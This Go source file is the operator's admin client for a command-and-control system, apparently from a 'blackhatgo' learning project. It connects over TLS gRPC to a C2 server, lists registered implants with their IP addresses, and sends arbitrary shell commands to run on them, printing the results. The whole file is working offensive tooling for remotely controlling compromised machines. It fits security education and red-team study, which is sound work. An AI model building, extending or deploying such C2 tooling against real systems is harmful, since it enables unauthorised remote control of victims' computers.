package main

import (
	"blackhatgo/c2c/grpcapi"
	"context"
	"fmt"
	"log"
	"os"

	"github.com/urfave/cli/v3"
	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	creds, err := loadTLSClientCreds()
	if err != nil {
		log.Fatalln(err)
	}
	opts = append(opts, grpc.WithTransportCredentials(creds))
	// opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.NewClient(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	var cmd = new(grpcapi.Command)
	ctx := context.Background()

	cmdFlags := &cli.Command{
		Commands: []*cli.Command{
			{
				Name:  "list",
				Usage: "List implants",
				Action: func(ctx context.Context, c *cli.Command) error {
					req := &grpcapi.Empty{}
					implantsList, err := client.ListRegisteredImplants(ctx, req)
					if err != nil {
						return err
					}
					if len(implantsList.Implants) == 0 {
						fmt.Println("No implants")
						return nil
					}
					for _, implant := range implantsList.Implants {
						fmt.Printf("%s - %s\n", implant.Id, implant.IpAddress)
					}
					return nil
				},
			},
		},

		// Run command
		Action: func(ctx context.Context, c *cli.Command) error {
			cmd.In = os.Args[1]
			cmd, err = client.RunCommand(ctx, cmd)
			if err != nil {
				return err
			}
			fmt.Println(cmd.Out)

			return nil
		},
	}

	if err := cmdFlags.Run(ctx, os.Args); err != nil {
		log.Fatal(err)
	}
}
